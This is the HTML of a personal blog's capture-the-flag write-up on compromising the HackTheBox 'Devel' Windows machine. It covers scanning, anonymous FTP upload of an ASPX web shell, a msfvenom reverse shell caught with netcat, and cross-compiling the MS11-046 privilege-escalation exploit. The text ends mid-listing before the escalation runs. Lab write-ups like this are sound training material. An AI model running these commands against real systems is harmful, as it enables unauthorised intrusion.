@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Devel HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Devel box from HackTheBox">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Devel HackTheBox - Write-Up</h1>
+          <p>Rooting the Devel box from HackTheBox</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Devel HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> July 23, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/chapl1n">Chapl1n</a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/windows">Windows</a>
+								
+                , <a href="/tags/privesc">Privesc</a>
+								
+                , <a href="/tags/ftp">Ftp</a>
+								
+                , <a href="/tags/spidering">Spidering</a>
+								
+                , <a href="/tags/web%20shell">Web shell</a>
+								
+                , <a href="/tags/privesc">Privesc</a>
+								
+                , <a href="/tags/exploit%20compilation">Exploit compilation</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>The first three &lsquo;HackTheBox&rsquo; writeups in this blog demonstrated my approach for gaining root access to a target system with and without Metasploit. However, after pwning Devel I felt it was unnecessary to use Metasploit. I researched other reports that did use Metasploit for Devel and for the most part they only used the multi-handler module in the framework for establishing a meterpreter session. Since all I wanted was to gain a shell, using meterpreter seemed pointless because tools like netcat (<code>nc</code>) do the same thing - i.e. a listener for receiving a reverse shell connection.</p>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---intial-nmap-scan">Step 1 - Intial nmap scan</h3>
+<p>To start, nmap is used to scan for open TCP ports and identify the services running on Devel. For a description of the specific switches used, take a look at my first article <a href="/blog/legacy/"><strong>Legacy</strong></a>.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ nmap -T4 -Pn -n --min-rate=1000 --max-rate=5000 -p- --open 10.10.10.5
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-14 15:37 BST
+Nmap scan report for 10.10.10.5
+Host is up (0.030s latency).
+Not shown: 65533 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 88.66 seconds
+</code></pre><p>The scan shows that TCP ports <code>21</code> (FTP) and <code>80</code> (HTTP) are open on Devel.</p>
+<h3 id="step-2---aggressive-nmap-scan">Step 2 - Aggressive nmap scan</h3>
+<p>An aggressive nmap scan will now be done for the open TCP ports to provide me with any additional information related to the system.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ nmap -T4 -Pn -n -p 21,80 -A -oA tcp_Agressive_Devel 10.10.10.5
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-14 15:44 BST
+Nmap scan report for 10.10.10.5
+Host is up (0.024s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
+</code></pre><p>The scan shows that anonymous access is permitted for the FTP server. This means that I am able to access its file contents and upload/downlaod files without credentials. There is a HTTP server present within Devel and its version is <a href="https://en.wikipedia.org/wiki/Internet_Information_Services"><code>IIS httpd 7.5</code></a>.  After a bit of research for this IIS version, I am making an educated guess that Devel&rsquo;s OS is either Windows 7 or WIndows Server 2008 R2.</p>
+<p>Internet Information Services (IIS) is a web server platform developed by Microsoft. I researched this a bit more to get a better understanding of what is going on and learned that the servers within Devel were built using the ASP.NET framework. A common file type used within ASP.NET based servers is <code>.aspx</code>, which will be talked about later.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<h3 id="step-1---access-ftp-server">Step 1 - Access FTP server</h3>
+<p>I start my enumeration of Devel by accessing the FTP server.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:student): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; 
+</code></pre><p>The username I use is <code>anonymous</code> and it doesn&rsquo;t matter what I give for the password thanks to the anonymous access.</p>
+<h3 id="step-2---enumerate-ftp-server-contents">Step 2 - Enumerate FTP server contents</h3>
+<pre><code>ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt;
+</code></pre><p>The following is a good resource for learning FTP command syntax:</p>
+<blockquote>
+<p><a href="https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/"><code>https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/</code></a></p>
+</blockquote>
+<p>Before going further with the FTP server, I am interested as to what the HTTP server holds.</p>
+<h3 id="step-3---view-http-server">Step 3 - View HTTP server</h3>
+<p><img src="/images/blog/devel/snippet_5.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Devel" /></p>
+<p>Once the IP address resolves, I am presented with an image regarding IIS7. The image contains a link to <a href="https://www.iis.net/"><code>iis.net</code></a>, the website owned by Microsoft for documenting IIS. Essentially, it is a default page used before somebody adds in their own web applciation. To get a better understanding of what the HTTP server hosts, I will use a technique called <code>spidering</code> (a.k.a <code>crawling</code>).</p>
+<h3 id="step-4---spidercrawl-the-web-server">Step 4 - Spider/Crawl the web server</h3>
+<p>Spidering is the process of enumerating all the files and directories within a server to get a better picture of its content&rsquo;s and functionality. Some &lsquo;crawlers&rsquo; will examine a web page and &lsquo;follow&rsquo; all the links as well as trying to &lsquo;guess&rsquo; the structure of a website using a dictionary of common words.  I am using the GUI tool <code>DirBuster</code> that comes pre-installed with Kali Linux to do this.</p>
+<p><img src="/images/blog/devel/snippet_6.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Load DirBuster - Devel" /></p>
+<p>DirBuster now needs to be configured to target Devel.</p>
+<p><img src="/images/blog/devel/snippet_7.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Configuring DirBuster - Devel" /></p>
+<p>As well as specifying the IP address and port of Devel, I include a wordlist from Kali Linux that DirBuster will use to identify if files or folders with a certain name exists. I set the file extensions to search for as .php, .txt and .zip, but in hindsight, it would have been more suitable to search for .asp and .aspx files as the server was built using ASP.NET. The number of threads (simultaneous operations performed) was increased so that the process would take less time to complete.</p>
+<h3 id="step-5---check-dirbuster-results">Step 5 - Check DirBuster results</h3>
+<p><img src="/images/blog/devel/snippet_8.png" width="100%" alt="HackTheBox Writeup by Chapl1n - DirBuster Results - Devel" /></p>
+<p><img src="/images/blog/devel/snippet_9.png" width="100%" alt="HackTheBox Writeup by Chapl1n - DirBuster Results - Devel" /></p>
+<p>The results show no additional files or directories stored within Devel&rsquo;s HTTP server. For the time being I will put DirBuster aside since I have other options for enumerating Devel. I do not want to waste time on something that possibly does not bear any fruit. The next tool I will use on the HTTP server is called <code>Nikto</code>.</p>
+<h3 id="step-6---nikto-scan">Step 6 - Nikto scan</h3>
+<p>This tool will enumerate the servers configuration, identify out-of-date software, malicious files and any detailed user permissions. In other words, it is a vulnerability scanner.  It is quite a noisy tool and will likely be picked up during a real pen test by a security operations team (the defenders who are known as a &lsquo;Blue Team&rsquo;).</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ sudo nikto -h 10.10.10.5
+[sudo] password for student: 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.5
++ Target Hostname:    10.10.10.5
++ Target Port:        80
++ Start Time:         2020-07-16 14:23:29 (GMT1)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/7.5
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 2.0.50727
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ /: Appears to be a default IIS 7 install.
++ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2020-07-16 14:40:10 (GMT1) (1001 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre><p>The scan shows some information but doesn&rsquo;t reveal enough that could be directly used to gain a shell on Devel. I will leave the HTTP server for now and return my focus to the FTP server.</p>
+<h2 id="ftp-revisited">FTP (Revisited)</h2>
+<p>With the anonymous access, I resume my enumeration of the FTP server by testing if I can place a file onto it.</p>
+<h3 id="step-1---place-file-onto-ftp-server">Step 1 - Place file onto FTP server</h3>
+<p>I create an empty text file called <code>test.txt</code> in my local attacking box and place it onto the server.</p>
+<pre><code>ftp&gt; put test.txt 
+local: test.txt remote: test.txt
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+226 Transfer complete.
+</code></pre><p>The transfer appears to have been a success, but I will now check the server contents to be assured of this.</p>
+<pre><code>ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+07-20-20  09:00PM                    0 test.txt
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt;
+</code></pre><p>One thing to note from the server is that the files are stored at the root of the web server. With root access to the web server through FTP, I can potentially upload a malicious file to it and create a reverse shell connection between Devel and my attacking box.</p>
+<p>To start, I place a web shell onto server, this acts as web page that allows me to execute commands at the OS level against Devel and access its file system. The shell would need to be a .aspx file as the server itself was built using ASP.NET. Thankfully Kali Linux contains a large variety of webshells for me to choose from.</p>
+<h3 id="step-2---finding-suitable-web-shell">Step 2 - Finding suitable web shell</h3>
+<p>A search on my attacking box is performed to find any pre-made web shells.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ locate webshell
+/usr/bin/webshells
+/usr/share/webshells
+/usr/share/doc/webshells
+/usr/share/doc/webshells/changelog.gz
+/usr/share/doc/webshells/copyright
+/usr/share/webshells/asp
+/usr/share/webshells/aspx
+/usr/share/webshells/cfm
+/usr/share/webshells/jsp
+/usr/share/webshells/laudanum
+/usr/share/webshells/perl
+/usr/share/webshells/php
+/usr/share/webshells/asp/cmd-asp-5.1.asp
+/usr/share/webshells/asp/cmdasp.asp
+/usr/share/webshells/aspx/cmdasp.aspx
+/usr/share/webshells/cfm/cfexec.cfm
+/usr/share/webshells/jsp/cmdjsp.jsp
+/usr/share/webshells/jsp/jsp-reverse.jsp
+/usr/share/webshells/perl/perl-reverse-shell.pl
+/usr/share/webshells/perl/perlcmd.cgi
+/usr/share/webshells/php/findsocket
+/usr/share/webshells/php/php-backdoor.php
+/usr/share/webshells/php/php-reverse-shell.php
+/usr/share/webshells/php/qsd-php-backdoor.php
+/usr/share/webshells/php/simple-backdoor.php
+/usr/share/webshells/php/findsocket/findsock.c
+/usr/share/webshells/php/findsocket/php-findsock-shell.php
+/var/cache/apt/archives/webshells_1.1+kali6_all.deb
+/var/lib/dpkg/info/webshells.list
+/var/lib/dpkg/info/webshells.md5sums
+/var/lib/dpkg/info/webshells.postinst
+/var/lib/dpkg/info/webshells.prerm
+</code></pre><p>As expected, there are a lot of web shells stored within Kali Linux, I am only interested .aspx web shells which this list has.</p>
+<pre><code>student@teacher:/usr/share/webshells/aspx$ ls
+cmdasp.aspx
+</code></pre><p>I see the file <code>cmdasp.aspx</code> which will hopefully allow me to view Devel&rsquo;s file system from the browser.</p>
+<pre><code>student@teacher:/usr/share/webshells/aspx$ cp cmdasp.aspx /home/student/hackthebox/Devel
+</code></pre><pre><code>student@teacher:~/hackthebox/Devel$ ls
+cmdasp.aspx  tcp_Agressive_Devel.gnmap  tcp_Agressive_Devel.nmap  tcp_Agressive_Devel.xml  test.txt
+</code></pre><h3 id="step-4---place-web-shell-onto-ftp-server">Step 4 - Place web shell onto FTP server</h3>
+<p>The next stage is to get this web shell onto the server.</p>
+<pre><code>ftp&gt; put cmdasp.aspx 
+local: cmdasp.aspx remote: cmdasp.aspx
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+226 Transfer complete.
+1442 bytes sent in 0.00 secs (9.8228 MB/s)
+</code></pre><pre><code>ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+07-20-20  09:49PM                 1442 cmdasp.aspx
+03-17-17  05:37PM                  689 iisstart.htm
+07-20-20  09:00PM                    0 test.txt
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>The web shell has been uploaded to the FTP server successfully.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h2 id="web-shell">Web Shell</h2>
+<p>With the web shell in place I should be able to view the file system of Devel from a browser.</p>
+<h3 id="step-1---using-the-web-shell-to-execute-commands-on-the-target">Step 1 - Using the Web Shell to execute commands on the target</h3>
+<p><img src="/images/blog/devel/snippet_19.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Webshell - Devel" /></p>
+<p>I use the <code>whoami</code> command to identify my current privileges with the web shell.</p>
+<p><img src="/images/blog/devel/snippet_20.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>The command shows the phrase <code>iis appool\web</code> - I had to research this as I unware what it meant and found out that it stands for <code>IIS Application pool</code>. It basically means that the web server is using an account with the lowest level of privileges possible. This makes sense - if an application get &lsquo;hacked&rsquo;, a low privilege account may limit how much damage they could have.  Here is a reference that helped me understand:</p>
+<blockquote>
+<p><a href="https://support.microsoft.com/en-gb/help/4466942/understanding-identities-in-iis"><code>https://support.microsoft.com/en-gb/help/4466942/understanding-identities-in-iis</code></a></p>
+</blockquote>
+<h3 id="step-2---enumerate-file-system">Step 2 - Enumerate file system</h3>
+<p>I start by checking what is in my current directory.</p>
+<p><img src="/images/blog/devel/snippet_21.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>I am unable to change directories using the web shell and must declare the entire filepath.</p>
+<p><img src="/images/blog/devel/snippet_22.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>Now with access to the <code>C</code> folder I must determine where to start looking for the user and root flags. The <code>Users</code> folder is my first guess as the previous systems have had the flags present there.</p>
+<p><img src="/images/blog/devel/snippet_23.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>The flags are more than likely to be held within the Administrator/babis folders.</p>
+<p><img src="/images/blog/devel/snippet_24.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>I tried to access the Administrator folder but did not receive any results. I presume this could be for one of two reasons, the first being that the folder is empty (unlikely) or that I do not have the permissions to view the folder contents. If the latter is true then I will need to perform some form of privilege escalation once I have established a shell connection between Devel and my attacking box.</p>
+<p><img src="/images/blog/devel/snippet_25.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Web Shell - Devel" /></p>
+<p>I tried to access the babis folder but I got the same result as the Administrator folder. It is becoming more apparent that I need to perform some form of privilege escalation (<code>privesc</code>) in order to get the flags for Devel.</p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<p>Before I can escalate my privileges I need to set up a reverse shell from Devel to my attacking box.</p>
+<h3 id="step-1---create-aspx-reverse-shell-payload">Step 1 - Create ASPX reverse shell payload</h3>
+<p>The first step is create the .aspx based reverse shell file with <code>msfvenom</code>.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.195 LPORT=4444 -f aspx &gt; reverse.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2729 bytes
+</code></pre><p>I have worked with msfvenom before but never for .aspx files, I found the following website to be really useful. A kind of cheatsheet for building different shells.</p>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/shells/shells/untitled#reverse-shell"><code>https://book.hacktricks.xyz/shells/shells/untitled#reverse-shell</code></a></p>
+</blockquote>
+<h3 id="step-2---place-reverse-shell-onto-ftp-server">Step 2 - Place Reverse Shell Onto FTP Server</h3>
+<p>I now need to place the reverse shell onto the FTP server.</p>
+<pre><code>ftp&gt; put reverse.aspx 
+local: reverse.aspx remote: reverse.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+2844 bytes sent in 0.00 secs (7.9306 MB/s)
+</code></pre><pre><code>ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+07-20-20  09:49PM                 1442 cmdasp.aspx
+03-17-17  05:37PM                  689 iisstart.htm
+07-20-20  11:17PM                 2844 reverse.aspx
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>The reverse shell payload has now been placed onto the server.</p>
+<h3 id="step-3---setup-listener">Step 3 - Setup listener</h3>
+<p>Before I execute the reverse shell I need to setup the listener on my attacking box to receive the connection from Devel.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ nc -nlvp 4444
+listening on [any] 4444 ...
+</code></pre><h3 id="step-4---execute-reverse-shell">Step 4 - Execute reverse shell</h3>
+<p>Now that the listener is in place, I can execute the reverse shell.</p>
+<p><img src="/images/blog/devel/snippet_30.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Reverse Shell - Devel" /></p>
+<p>In my attacking box, I can see that a shell has been returned.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.195] from (UNKNOWN) [10.10.10.5] 49185
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;
+</code></pre><h3 id="step-5---enumerate-file-system">Step 5 - Enumerate file system</h3>
+<p>I have a reverse shell and can now check if I can access the Administrator or babis folders.</p>
+<pre><code>c:\Users&gt;cd Administrator
+cd Administrator
+Access is denied.
+</code></pre><pre><code>c:\Users&gt;cd babis
+cd babis
+Access is denied.
+</code></pre><p>I don&rsquo;t have the permissions required to access these folders which means my job got a bit longer.</p>
+<h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1>
+<p>In order to access the Administrator and babis folders I need to perform some form of privilege escalation <code>privesc</code>. I had a tiny bit of experience doing Linux Privilege Escalation with the Lame system but I need to do research and look around for good sources for this. A few good sources of information are:</p>
+<blockquote>
+<ul>
+<li><a href="https://www.fuzzysecurity.com/tutorials/16.html"><code>https://www.fuzzysecurity.com/tutorials/16.html</code></a> - This is just a guide of different techniques for identifying information that could potentially lead to escalated privileges</li>
+<li><a href="https://github.com/GhostPack/SharpUp"><code>https://github.com/GhostPack/SharpUp</code></a> - This is a tool which enumerates the system and performs various checks to identify any privesc opportunities.</li>
+</ul>
+</blockquote>
+<h3 id="step-1---enumerate-system-infrastructure">Step 1 - Enumerate system infrastructure</h3>
+<p>I could potentially automate this process for myself by using the tool <code>SharpUp</code> but I want to be able to do things myself instead of relying on automatic tools. Once I learn how to do things manually, then I can look at using automation.  I will therefore start by using the guide from fuzzysecurity to help me. The first thing I will look into is what OS Version is being used by Devel and research for any privilege escaltion possibilities.</p>
+<h3 id="step-11-identify-os-version">Step 1.1 Identify OS version</h3>
+<pre><code>c:\&gt;systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 
+System Boot Time:          22/7/2020, 5:32:39 
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 705 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.545 MB
+Virtual Memory: In Use:    502 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+</code></pre><p>I used the command <code>systeminfo</code> which gives me an overview of Devel&rsquo;s architecture and how &lsquo;up to date&rsquo; it is. I see the OS Version from the results clearly on the third row.</p>
+<pre><code>OS Version:                6.1.7600 N/A Build 7600
+</code></pre><h3 id="step-12---research-os-version">Step 1.2 - Research OS version</h3>
+<p>I don&rsquo;t know if this OS version will be helpful or not so I do a quick Google to see if anything comes up.</p>
+<p><img src="/images/blog/devel/snippet_37.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Privilege Escalation Research - Devel" /></p>
+<p>The first result shows a Local Privilege Escalation script for Windows systems that have this OS version. The script relates to a exploit registered as <code>MS11-046</code>.</p>
+<h3 id="step-2---find-ms11-046-exploit-script">Step 2 - Find MS11-046 exploit script</h3>
+<p>After some &lsquo;Google dorking&rsquo; (site:github.com MS11-046), I found a repo (repository) by <a href="https://github.com/abatchy17/WindowsExploits"><code>abatchy17</code></a> on Github, where both source code and compiled versions of exploits are available, including MS11-046.</p>
+<p><img src="/images/blog/devel/snippet_38.png" width="100%" alt="HackTheBox Writeup by Chapl1n - MS11-046 - Devel" /></p>
+<p>Normally I would take the pre-compiled executable from Github for my work but here I want try to compile the file myself to gain root privileges to Devel.  Besides, it always good practice to review the source first to ensure it doesn&rsquo;t contain any malicious code that could cause damage to my attacking setup.</p>
+<h3 id="step-3---clone-github-repo">Step 3 - Clone github repo</h3>
+<p>I could just download the individual c file from the repo but there are a lot of exploit scripts that could become very useful in the future for me, so I clone the whole repo.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ git clone https://github.com/abatchy17/WindowsExploits.git
+Cloning into 'WindowsExploits'...
+remote: Enumerating objects: 172, done.
+remote: Total 172 (delta 0), reused 0 (delta 0), pack-reused 172
+Receiving objects: 100% (172/172), 43.08 MiB | 4.45 MiB/s, done.
+Resolving deltas: 100% (21/21), done.
+</code></pre><p>When checking the folder for MS11-046, I see both source code and compiled versions of the exploit.</p>
+<pre><code>student@teacher:~/hackthebox/Devel/WindowsExploits/MS11-046$ ls
+40564.c  MS11-046.exe
+</code></pre><h3 id="step-4---cross-compile-c-code">Step 4 - Cross compile C code</h3>
+<p>One thing to be aware of is that I am compiling Windows source code on a Linux based system. I cannot use the Linux compiler gcc as this is meant for Linux systems. I need to be able to <code>cross-compile</code> the source code to run on Devel (Windows).  A tool called <code>mingw</code> can be used for this specific purpose. Mingw does not come as part of Kali Linux so I must install it first.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ sudo apt install mingw-w64 -y
+</code></pre><p>The -y argument is just so I am not prompted to say whether or not I am sure if I want to install the package. I can now cross compile the script to work for Devel.</p>
+<pre><code>student@teacher:~/hackthebox/Devel$ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
+</code></pre><p>Devel is a 32-bit based system hence the reason for the <code>-lws2_32</code> switch. A good resource that I used for mingw comes from hackingtutorials:</p>
+<blockquote>
+<p><a href="https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/"><code>https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/</code></a></p>
+</blockquote>
+<p>With the script compiled, I can now place it onto the server.</p>
+<h3 id="step-5---place-exploit-onto-ftp-server">Step 5 - Place exploit onto FTP server</h3>
+<pre><code>ftp&gt; binary
+200 Type set to I.
+ftp&gt; put exploit.exe 
+local: exploit.exe remote: exploit.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+298764 bytes sent in 0.20 secs (1.3906 MB/s)
+</code></pre><p>The file transfer process is a little different than normal as I have to specify <code>binary</code> mode beforehand, this instructs the FTP application that a binary file is being transferred instead of a plain text ASCII file. I found the following blog to be quite helpful:</p>
+<blockquote>
+<p><a href="https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files"><code>https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files</code></a></p>
+</blockquote>
+<pre><code>ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+07-23-20  02:58AM               298764 exploit.exe
+03-17-17  05:37PM                  689 iisstart.htm
+07-23-20  02:56AM                 2764 reverse.aspx
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>With the file now transferred to the server, I now go back to my reverse shell to see where it was stored on the target. I spent a bit of time enumerating the file system but learned that for a Windows IIS web server, web applications are typically stored in a folder called <code>inetpub</code>. The exploit was found at the filepath <code>c:\inetpub\wwwroot\</code> in Devel.</p>
+<pre><code>C:\inetpub\wwwroot&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\inetpub\wwwroot
+
+23/07/2020  02:58     &lt;DIR&gt;          .
+23/07/2020  02:58     &lt;DIR&gt;          ..
+18/03/2017  02:06     &lt;DIR&gt;          aspnet_client
+23/07/2020  02:58            298.764 exploit.exe
+17/03/2017  05:37                689 iisstart.htm
+23/07/2020  02:56              2.764 reverse.aspx
+17/03/2017  05:37            184.946 welcome.png
+               4 File(s)        487.163 bytes
+               3 Dir(s)  24.382.787.584 bytes free
